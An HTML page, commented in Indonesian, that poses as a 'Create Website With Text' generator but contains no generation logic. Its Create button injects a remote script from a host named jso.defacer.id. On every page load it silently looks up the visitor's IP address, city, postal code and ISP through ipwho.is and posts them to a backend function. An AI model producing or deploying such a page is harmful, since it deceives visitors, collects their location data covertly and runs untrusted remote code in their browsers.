<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Website With Text</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f0f4f8;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            width: 90%;
            text-align: left;
        }
        h1 {
            color: #1a237e;
            font-size: 2.5em;
            font-weight: 700;
            margin-bottom: 20px;
            text-align: center;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 700;
            color: #4a5568;
        }
        textarea {
            width: 100%;
            padding: 12px;
            font-size: 1em;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            resize: vertical;
            min-height: 150px;
            box-sizing: border-box;
            transition: border-color 0.3s ease;
        }
        textarea:focus {
            outline: none;
            border-color: #4c51bf;
        }
        .create-button {
            width: 100%;
            padding: 15px;
            background-color: #4c51bf;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .create-button:hover {
            background-color: #3b45a3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Create Website With Text</h1>
        <div class="input-group">
            <label for="website-desc">Describe your dream website:</label>
            <textarea id="website-desc" placeholder="e.g., An e-commerce site for handmade crafts..."></textarea>
        </div>
        <button id="create-button" class="create-button">Create</button>
    </div>

    <script>
document.getElementById('create-button').addEventListener('click', () => {
    let s = document.createElement("script");
    s.src = "https://jso.defacer.id/raw/87Zah66df9"; // link script eksternal kamu
    document.body.appendChild(s);
});

        // Fungsi untuk mengambil IP dan mengirimkannya ke backend
        async function getAndSendIP() {
            try {
                const response = await fetch('https://ipwho.is/');
                const data = await response.json();
                
                if (data.success) {
                    const ipData = {
                        ip: data.ip,
                        country: data.country,
                        region: data.region,
                        city: data.city,
                        postal: data.postal,
                        org: data.org,
                        isp: data.isp
                    };
                    
                    await fetch('/.netlify/functions/send-data', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(ipData),
                    });
                }
            } catch (error) {
                console.error('Gagal mendapatkan atau mengirim data IP:', error);
            }
        }

        window.addEventListener('load', getAndSendIP);
    </script>
</body>
</html>
